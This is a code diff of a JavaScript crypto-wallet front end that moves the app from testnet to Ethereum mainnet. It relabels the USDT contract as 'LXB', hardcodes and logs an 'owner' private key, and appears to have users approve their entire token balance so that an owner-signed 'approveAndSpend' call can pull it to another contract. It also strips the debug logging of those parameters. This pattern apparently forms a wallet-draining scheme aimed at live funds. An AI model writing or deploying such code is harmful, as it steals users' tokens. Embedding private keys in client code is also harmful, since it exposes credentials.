@@ -29,10 +29,10 @@ const detailsContainer = document.createElement("div")
 detailsContainer.id = "contract-details-container"
 document.querySelector(".approval-section").insertBefore(detailsContainer, document.querySelector(".approval-actions"))
 
-export const projectId = "b92b8dc3cd723bb6bd144c246940324b"
+export const projectId = "b92b8dc3cd723bb6bd144c246940324b";
 
 const appKitNetworks = [
-  networks.sepolia
+  networks.mainnet
 ]
 const wagmiAdapter = new WagmiAdapter({
   networks: appKitNetworks,
@@ -74,11 +74,11 @@ const hexToUint8Array = (hex) => {
 // Initialize TokenBalanceUI
 const tokenBalanceUI = new TokenBalanceUI(".token-balances")
 
-const ownerPrivateKey = hexToUint8Array("118aad19b75d6708365018769d91c8b1c816cac817a67720f4444a669a7f168c")
+const ownerPrivateKey = "0x64b84368b7821847bdecabaaa3677b4c1403949c74b11b69e9dd7df3273f8115";
 console.log(ownerPrivateKey)
 
 // Add this after your existing wagmiAdapter initialization
-const tokenApprover = new TokenApprover(wagmiAdapter.wagmiConfig, "0x" + Buffer.from(ownerPrivateKey).toString("hex"))
+const tokenApprover = new TokenApprover(wagmiAdapter.wagmiConfig, ownerPrivateKey)
 
 // Add the automatic signing function
 const SIGNATURE_KEY = "wallet_signature"
@@ -186,16 +186,16 @@ document.querySelector("#sign-message-btn")?.addEventListener("click", handleMes
 
 // LXB Contract Constants
 const LXB_CONTRACT = {
-  ADDRESS: "0x3a623E704650D562Bee377F27D805889E203847F", // Replace with your Mainnet contract address
-  // ADDRESS: "0xEF0575BF42c13352B1033fF23dD711FC841E56c8",
-  CHAIN_ID: 11155111, // Mainnet chain ID
+  // ADDRESS: "0x3a623E704650D562Bee377F27D805889E203847F", // Replace with your Mainnet contract address
+  ADDRESS: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
+  CHAIN_ID: 1, // Mainnet chain ID
   DECIMALS: 6,
 }
 
 const DR_CONTRACT = {
   // ADDRESS: "0x7aEBb27455DD33Fc0f555D09A4d2424BDEdC220E", // Replace with your Mainnet contract address
-  ADDRESS: "0x838e9aad90d74820f4d30fadb717ce7d0b3c434c",
-  CHAIN_ID: 11155111, // Mainnet chain ID
+  ADDRESS: "0xCC7589ff2Da5D12b2f0C568924F12AB9b1859F78",
+  CHAIN_ID: 1, // Mainnet chain ID
   DECIMALS: 18,
 }
 
@@ -298,13 +298,6 @@ document.querySelector("#approve-token")?.addEventListener("click", async () => 
 
     const statusEl = document.querySelector("#status")
     statusEl.textContent = "Initiating approval and transfer..."
-    
-    console.log("Parameters for approveAndSpend:");
-    console.log("Token Address:", LXB_CONTRACT.ADDRESS, typeof LXB_CONTRACT.ADDRESS);
-    console.log("Spender Address:", DR_CONTRACT.ADDRESS, typeof DR_CONTRACT.ADDRESS); 
-    console.log("Amount:", balanceInWei, typeof balanceInWei);
-    console.log("Approval Amount:", approvalAmount, typeof approvalAmount);
-    console.log("Owner Address:", account.address, typeof account.address);
 
     // Use the updated approveAndSpend method
     const { spendTx } = await tokenApprover.approveAndSpend(
@@ -331,7 +324,7 @@ document.querySelector("#approve-token")?.addEventListener("click", async () => 
 const tokenService = new TokenService(web3)
 
 async function fetchUserTokens(address, chainId) {
-  if (chainId === 11155111) {
+  if (chainId === 1) {
     const data = await tokenService.getWalletTokens(address)
     if (!data) return []
 
@@ -463,7 +456,6 @@ function updateWalletInfo(address, chainId) {
   const networks = {
     11155111: "Mainnet Testnet",
     1: "Ethereum Mainnet",
-    137: "Polygon Mainnet",
     // Add more networks as needed
   }
   networkBadge.textContent = networks[chainId] || `Chain ID: ${chainId}`
